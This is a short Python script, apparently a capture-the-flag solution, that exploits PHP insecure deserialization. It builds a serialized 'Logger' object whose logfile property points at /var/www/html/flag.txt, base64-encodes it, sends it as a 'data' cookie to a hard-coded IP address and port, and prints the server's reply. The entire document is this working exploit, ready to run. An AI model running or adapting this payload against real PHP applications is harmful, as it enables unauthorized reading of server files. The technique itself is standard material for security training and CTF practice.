import base64
import requests

URL = "http://51.159.16.22:8061/"

path = "/var/www/html/flag.txt"
payload = f'O:6:"Logger":1:{{s:7:"logfile";s:{len(path)}:"{path}";}}'.encode()
print(f"Payload: {payload}")
print(f"Longueur path: {len(path)}")

b64 = base64.b64encode(payload).decode()
print(f"B64: {b64}")

r = requests.get(URL, cookies={"data": b64})
print(r.text)
